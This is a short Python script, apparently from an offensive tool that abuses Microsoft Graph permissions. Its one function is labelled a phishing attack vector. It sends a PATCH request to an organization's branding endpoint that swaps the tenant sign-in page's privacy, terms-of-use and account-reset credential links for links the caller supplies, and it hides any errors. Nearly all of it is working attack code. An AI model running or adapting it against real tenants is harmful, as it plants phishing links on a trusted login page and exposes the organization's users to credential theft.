import requests
import colorama
from colorama import Fore, Style


def Organization_Vectors(request_headers, OrgSettings):
    print()
    print(
        "Organization.ReadWrite.All - Allows the app to read and write the organization and related resources, "
        "on behalf of the signed-in user.")
    print(
        "OrganizationalBranding.ReadWrite.All - Read and write organizational branding information.")
    print()
    try:
        print("Attack vector - Phishing")

        create_message_URL = "https://graph.microsoft.com/v1.0/organization/" + OrgSettings["orgID"] + "/branding"
        message_obj = {
            "customPrivacyAndCookiesUrl": OrgSettings["urlPrivacy"],
            "customTermsOfUseUrl": OrgSettings["TermsUrl"],
            "customAccountResetCredentialsUrl": OrgSettings["resetUrl"]
        }

        result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)

        if result.status_code == 204:
            print("Seems like your data was added to the login page.")



    except:
        pass
